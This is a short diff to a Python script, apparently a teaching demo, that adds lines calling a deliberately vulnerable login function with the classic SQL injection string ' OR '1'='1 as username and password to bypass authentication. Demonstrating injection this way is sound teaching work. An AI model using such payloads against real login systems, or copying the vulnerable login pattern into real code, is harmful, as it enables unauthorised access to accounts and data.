@@ -31,3 +31,6 @@ def login_vulnerable(username, password):
 # Attacker input: Bypass authentication using SQL Injection
 malicious_username = "' OR '1'='1"
 malicious_password = "' OR '1'='1"
+
+print("Attempting SQL Injection...")
+result = login_vulnerable(malicious_username, malicious_password)
